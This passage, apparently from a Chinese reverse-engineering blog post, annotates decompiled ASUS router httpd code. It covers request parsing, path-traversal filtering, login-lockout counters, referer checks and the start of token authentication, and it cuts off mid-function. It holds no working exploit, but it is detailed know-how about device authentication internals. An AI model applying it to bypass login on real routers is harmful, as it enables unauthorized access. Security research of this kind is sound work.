class="number">10000</span>, dword_CF700) )       <span class="comment">// 获取第一行</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"> path = line;</span><br><span class="line"> strsep(&amp;path, <span class="string">" "</span>);</span><br><span class="line"> <span class="keyword">while</span> ( path &amp;&amp; *path == <span class="string">' '</span> )</span><br><span class="line">   ++path;</span><br><span class="line"> protocol = path;</span><br><span class="line"> strsep(&amp;protocol, <span class="string">" "</span>);</span><br><span class="line"> <span class="keyword">while</span> ( protocol &amp;&amp; *protocol == <span class="string">' '</span> )</span><br><span class="line">   ++protocol;</span><br><span class="line"> stringp = protocol;</span><br><span class="line"> strsep(&amp;stringp, <span class="string">" "</span>);</span><br><span class="line"> <span class="keyword">if</span> ( !path || !protocol )</span><br><span class="line"> {</span><br><span class="line">   v0 = <span class="string">"Can't parse request."</span>;</span><br><span class="line">   v1 = <span class="string">"Bad Request"</span>;</span><br><span class="line">   <span class="keyword">goto</span> LABEL_60;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>如果数据不正常会报出Bad Request的错误，之后会取header中的数据并查看是否正常</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">file = path + <span class="number">1</span>;</span><br><span class="line">  v17 = path[<span class="number">1</span>];</span><br><span class="line">  v18 = <span class="built_in">strlen</span>(path + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v17 == <span class="string">'/'</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(file, <span class="string">".."</span>)</span><br><span class="line">    || !<span class="built_in">strncmp</span>(file, <span class="string">"../"</span>, <span class="number">3u</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(file, <span class="string">"/../"</span>)</span><br><span class="line">    || !<span class="built_in">strcmp</span>(&amp;file[v18 - <span class="number">3</span>], <span class="string">"/.."</span>) )</span><br><span class="line">  {</span><br><span class="line">    v0 = <span class="string">"Illegal filename."</span>;</span><br><span class="line">    v1 = <span class="string">"Bad Request"</span>;</span><br><span class="line">LABEL_60:</span><br><span class="line">    v15 = <span class="number">400</span>;</span><br><span class="line">LABEL_57:</span><br><span class="line">    sub_5ED20(v15, v1, v0);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>接着会获取对应的cookie等数据，检查url，防止目录穿越</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v17 || file[v18 - <span class="number">1</span>] == <span class="string">'/'</span> )           <span class="comment">// 默认访问的页面，第一次访问是QIS设备，普通访问是index_page</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( sub_5FFAC() )</span><br><span class="line">      file = <span class="string">"QIS_default.cgi"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file = &amp;indexpage;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">memset</span>(url, <span class="number">0</span>, <span class="keyword">sizeof</span>(url));</span><br><span class="line">  v19 = index(file, <span class="string">'?'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">  {</span><br><span class="line">    v21 = <span class="built_in">strlen</span>(file);</span><br><span class="line">    v22 = v21 - <span class="built_in">strlen</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v22 &gt;= <span class="number">0x81</span> )</span><br><span class="line">      file_len = <span class="number">128</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file_len = v22;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    file_len = <span class="number">127</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">strncpy</span>(url, file, file_len);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="built_in">strstr</span>(url, <span class="string">".asp"</span>) || <span class="built_in">strstr</span>(url, <span class="string">".htm"</span>))</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">"update_networkmapd.asp"</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">"update_clients.asp"</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">"update_customList.asp"</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(current_page_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(current_page_name));</span><br><span class="line">    <span class="built_in">snprintf</span>(current_page_name, <span class="number">0x80</span>u, <span class="string">"%s"</span>, url);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>判断是否存在.asp和.html并把一些特定的url放入current_page_name中</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cur_login_ip_type )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( (lock_flag &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        login_timestamp_tmp_wan = uptime(v28);</span><br><span class="line">        v29 = login_timestamp_tmp_wan - last_login_timestamp_wan;</span><br><span class="line">        login_dt = login_timestamp_tmp_wan - last_login_timestamp_wan;</span><br><span class="line">        v32 = last_login_timestamp_wan &lt;= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( last_login_timestamp_wan )</span><br><span class="line">          v32 = v29 &lt;= <span class="number">300</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(file, <span class="string">"Main_Login.asp"</span>, <span class="number">0xE</span>u) || login_error_status != <span class="number">7</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          last_login_timestamp_wan = <span class="number">0</span>;</span><br><span class="line">          login_try_wan = <span class="number">0</span>;</span><br><span class="line">          v31 = lock_flag &amp; <span class="number">0xFFFFFFFD</span>;</span><br><span class="line">LABEL_107:</span><br><span class="line">          lock_flag = v31;</span><br><span class="line">          login_error_status = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>判断WAN口是否登陆频繁，如果频繁则进行锁定处理</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (lock_flag &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      login_timestamp_tmp = uptime(v28);</span><br><span class="line">      v29 = login_timestamp_tmp - last_login_timestamp;</span><br><span class="line">      login_dt = login_timestamp_tmp - last_login_timestamp;</span><br><span class="line">      v30 = last_login_timestamp &lt;= <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( last_login_timestamp )</span><br><span class="line">        v30 = v29 &lt;= <span class="number">300</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v30 )</span><br><span class="line">      {</span><br><span class="line">        last_login_timestamp = <span class="number">0</span>;</span><br><span class="line">        login_try = <span class="number">0</span>;</span><br><span class="line">        v31 = lock_flag &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_107;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(file, <span class="string">"Main_Login.asp"</span>, <span class="number">0xE</span>u) || login_error_status != <span class="number">7</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_110:</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(url, <span class="string">".png"</span>) )</span><br><span class="line">        {</span><br><span class="line">          send_login_page(<span class="number">0</span>, <span class="number">7</span>, url, <span class="number">0</span>, v29, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><p>判断LAN口是否登陆频繁，如果频繁则进行锁定处理</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    handler = (mime_handlers + dest);</span><br><span class="line">    pattern = *(mime_handlers + dest);</span><br><span class="line">    <span class="keyword">if</span> ( !pattern )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_241;</span><br><span class="line">    <span class="keyword">if</span> ( !do_ssl || (v81 = handler-&gt;pattern, v41 = <span class="built_in">strcmp</span>(url, <span class="string">"offline.htm"</span>), pattern = v81, v41) )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( match(pattern, url) )             </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    dest += <span class="number">24</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>查看url是否在mime_handlers中</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">login_state_fromapp = delim == <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( delim == <span class="number">3</span> )</span><br><span class="line">    login_state_fromapp = fromapp == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( login_state_fromapp &amp;&amp; (mime_exception &amp; <span class="number">8</span>) == <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v45 = <span class="built_in">strncmp</span>(file, <span class="string">"Main_Login.asp"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v45 || login_error_status != <span class="number">9</span> )</span><br><span class="line">    {</span><br><span class="line">      v46 = v45 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( handler-&gt;auth )                     </span><br><span class="line">        v46 |= <span class="number">1u</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v46 )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(line, <span class="string">"post"</span>) &amp;&amp; handler-&gt;input )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">for</span> ( i = v76; i; --i )</span><br><span class="line">            fgetc(dword_CF700);</span><br><span class="line">        }</span><br><span class="line">        v47 = <span class="number">0</span>;</span><br><span class="line">        v48 = <span class="number">9</span>;</span><br><span class="line">        v49 = <span class="number">0</span>;</span><br><span class="line">        v50 = <span class="number">0</span>;</span><br><span class="line">        v71 = <span class="number">0</span>;</span><br><span class="line">        a5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_140;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>如果是APP发起但未登录成功的请求，则对需要登录的页面进行保护，返回登录页面</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !handler-&gt;auth )                         // 不需要认证</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (do_referer &amp; <span class="number">1</span>) == <span class="number">0</span> )                // referer是否正确</span><br><span class="line">      goto LABEL_190;</span><br><span class="line">    v53 = sub_59CE0(v74, fromapp);</span><br><span class="line">    <span class="keyword">if</span> ( !v53 )</span><br><span class="line">      goto LABEL_190;</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(line, <span class="string">"post"</span>) &amp;&amp; handler-&gt;<span class="built_in">input</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">for</span> ( j = v76; j; --j )</span><br><span class="line">        fgetc(dword_CF700);</span><br><span class="line">    }</span><br><span class="line">LABEL_184:</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    v71 = <span class="number">0</span>;</span><br><span class="line">    v49 = <span class="number">0</span>;</span><br><span class="line">    a5 = <span class="number">0</span>;</span><br><span class="line">LABEL_185:</span><br><span class="line">    v48 = v53;</span><br><span class="line">LABEL_192:</span><br><span class="line">    v50 = fromapp;</span><br><span class="line">LABEL_140:</span><br><span class="line">    send_login_page(v50, v48, v49, v47, a5, v71);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>如果不需要认证，则判断referer是否正确，如果referer不正确则需要login</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (mime_exception &amp; <span class="number">2</span>) == <span class="number">0</span> || x_Setting )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !fromapp &amp;&amp; sub_5EB38(<span class="string">"re_mode"</span>, <span class="string">"1"</span>) &amp;&amp; !nvram_get_int(&amp;unk_6B710) &amp;&amp; !sub_5CBC4(file) )</span><br><span class="line">    {</span><br><span class="line">      v52 = strcpy(v90, <span class="string">"&lt;meta http-equiv=\\"</span>refresh\\<span class="string">" content=\\"</span><span class="number">0</span>; url=message.htm\\<span class="string">"&gt;\\r\\n"</span>);</span><br><span class="line">      send_page(<span class="number">200</span>, <span class="string">"OK"</span>, <span class="number">0</span>, v52, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( (mime_exception &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( (do_referer &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        v53 = sub_599A8(v74, fromapp);</span><br><span class="line">        <span class="keyword">if</span> ( v53 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( !strcasecmp(line, <span class="string">"post"</span>) &amp;&amp; handler-&gt;<span class="built_in">input</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">for</span> ( k = v76; k; --k )</span><br><span class="line">              fgetc(dword_CF700);</span><br><span class="line">          }</span><br><span class="line">          goto LABEL_184;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      handler-&gt;auth(auth_userid, &amp;auth_passwd, auth_realm);// auth函数进行用户名密码验证</span><br><span class="line">      v53 = auth_check(auth_realm, authorization, url, file, v72, fromapp);</span><br><span class="line">      <span class="keyword">if</span> ( v53 )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(line, <span class="string">"post"</span>) &amp;&amp; handler-&gt;<span class="built_in">input</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">for</span> ( m = v76; m; --m )</span><br><span class="line">            fgetc(dword_CF700);</span><br><span class="line">        }</span><br><span class="line">        v49 = url;</span><br><span class="line">        v71 = add_try;</span><br><span class="line">        a5 = auth_check_dt;</span><br><span class="line">        v47 = file;</span><br><span class="line">        goto LABEL_185;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>进行认证检查，会认证用户名密码、referer等信息，如果失败则返回login页面，这里跟进一下auth_check</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall auth_check(</span><br><span class="line">        <span class="built_in">int</span> auth_realm,</span><br><span class="line">        <span class="built_in">int</span> authorization,</span><br><span class="line">        const char *url,</span><br><span class="line">        <span class="built_in">int</span> file,</span><br><span class="line">        const char *cookies,</span><br><span class="line">        <span class="built_in">int</span> fromapp)</span><br><span class="line">{</span><br><span class="line">  void *v7; // r0</span><br><span class="line">  <span class="built_in">bool</span> v8; // cc</span><br><span class="line">  char *v9; // r5</span><br><span class="line">  <span class="built_in">int</span> *v10; // r0</span><br><span class="line">  <span class="built_in">int</span> v11; // r5</span><br><span class="line">  <span class="built_in">int</span> *v12; // r4</span><br><span class="line">  <span class="built_in">bool</span> v13; // cc</span><br><span class="line">  char *v14; // r5</span><br><span class="line">  <span class="built_in">int</span> *v15; // r0</span><br><span class="line">  <span class="built_in">int</span> result; // r0</span><br><span class="line">  char *asus_token_string; // r0</span><br><span class="line">  char *asus_token_value; // r9</span><br><span class="line">  size_t v19; // r0</span><br><span class="line">  unsigned <span class="built_in">int</span> v20; // r2</span><br><span class="line">  <span class="built_in">int</span> *v22; // r0</span><br><span class="line">  <span class="built_in">int</span> v23; // r5</span><br><span class="line">  <span class="built_in">int</span> *v24; // r4</span><br><span class="line">  char token[<span class="number">64</span>]; // [sp+8h] [bp-40h] BYREF</span><br><span class="line"></span><br><span class="line">  v7 = memset(token, <span class="number">0</span>, 0x20u);</span><br><span class="line">  <span class="keyword">if</span> ( cur_login_ip_type )                      // 检查登录失败锁定状态</span><br><span class="line">  {</span><br><span class="line">    login_timestamp_tmp_wan = uptime(v7);</span><br><span class="line">    auth_check_dt = login_timestamp_tmp_wan - last_login_timestamp_wan;</span><br><span class="line">    v13 = last_login_timestamp_wan &lt;= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( last_login_timestamp_wan )</span><br><span class="line">      v13 = login_timestamp_tmp_wan - last_login_timestamp_wan &lt;= <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    {</span><br><span class="line">      last_login_timestamp_wan = <span class="number">0</span>;</span><br><span class="line">      login_try_wan = <span class="number">0</span>;</span><br><span class="line">      lock_flag &amp;= ~2u;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( login_try_wan &gt; <span class="number">4</span> )</span><br><span class="line">    {</span><br><span class="line">      lock_flag |= 2u;</span><br><span class="line">      v14 = inet_ntoa(login_ip_tmp);</span><br><span class="line">      <span class="keyword">if</span> ( !(login_try_wan % 5u) )</span><br><span class="line">      {</span><br><span class="line">        sub_5B2F4(login_try_wan / 5u);</span><br><span class="line">        logmessage_normal(</span><br><span class="line">          <span class="string">"HTTP login"</span>,</span><br><span class="line">          <span class="string">"Detect abnormal logins at %d times. The newest one was from %s in auth check."</span>,</span><br><span class="line">          login_try_wan,</span><br><span class="line">          v14);</span><br><span class="line">      }</span><br><span class="line">      add_try = <span class="number">1</span>;</span><br><span class="line">      v15 = _errno_location();</span><br><span class="line">      v11 = *v15;</span><br><span class="line">      v12 = v15;</span><br><span class="line">      <span class="keyword">if</span> ( f_exists(<span class="string">"/tmp/HTTPD_DEBUG"</span>) &gt; <span class="number">0</span> || nvram_get_int(<span class="string">"HTTPD_DBG"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        Debug2File(<span class="string">"/jffs/HTTPD_DEBUG.log"</span>, <span class="string">"[%s:(%d)]: LOGINLOCK\\n"</span>, <span class="string">"auth_check"</span>, <span class="number">985</span>);</span><br><span class="line">      goto LABEL_23;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    login_timestamp_tmp = uptime(v7);</span><br><span class="line">    auth_check_dt = login_timestamp_tmp - last_login_timestamp;</span><br><span class="line">    v8 = last_login_timestamp &lt;= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( last_login_timestamp )</span><br><span class="line">      v8 = login_timestamp_tmp - last_login_timestamp &lt;= <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    {</span><br><span class="line">      last_login_timestamp = <span class="number">0</span>;</span><br><span class="line">      login_try = <span class="number">0</span>;</span><br><span class="line">      lock_flag &amp;= ~1u;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( login_try &gt; <span class="number">4</span> )</span><br><span class="line">    {</span><br><span class="line">      lock_flag |= 1u;</span><br><span class="line">      v9 = inet_ntoa(login_ip_tmp);</span><br><span class="line">      <span class="keyword">if</span> ( !(login_try % 5u) )</span><br><span class="line">      {</span><br><span class="line">        sub_5B2F4(login_try / 5u);</span><br><span class="line">        logmessage_normal(</span><br><span class="line">          <span class="string">"HTTP login"</span>,</span><br><span class="line">          <span class="string">"Detect abnormal logins at %d times. The newest one was from %s in auth check."</span>,</span><br><span class="line">          login_try,</span><br><span class="line">          v9);</span><br><span class="line">      }</span><br><span class="line">      add_try = <span class="number">1</span>;</span><br><span class="line">      v10 = _errno_location();</span><br><span class="line">      v11 = *v10;</span><br><span class="line">      v12 = v10;</span><br><span class="line">      <span class="keyword">if</span> ( f_exists(<span class="string">"/tmp/HTTPD_DEBUG"</span>) &gt; <span class="number">0</span> || nvram_get_int(<span class="string">"HTTPD_DBG"</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        Debug2File(<span class="string">"/jffs/HTTPD_DEBUG.log"</span>, <span class="string">"[%s:(%d)]: LOGINLOCK\\n"</span>, <span class="string">"auth_check"</span>, <span class="number">959</span>);</span><br><span class="line">LABEL_23:</span><br><span class="line">      *v12 = v11;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  result = auth_passwd;</span><br><span class="line">  <span class="keyword">if</span> ( auth_passwd )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !cookies || (asus_token_string = strstr(cookies, <span class="string">"asus_token"</span>)) == <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !sub_5FFAC() )</span><br><span class="line">      {</span><br><span class="line">        add_try = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      goto LABEL_27;</span><br><span class="line">    }</span><br><span class="line">    asus_token_value = asus_token_string + <span class="number">11</span>;</span><br><span class="line">    v19 = strspn(asus_token_string + <span class="number">11</span>, <span class="string">" \\t"</span>);</span><br><span class="line">    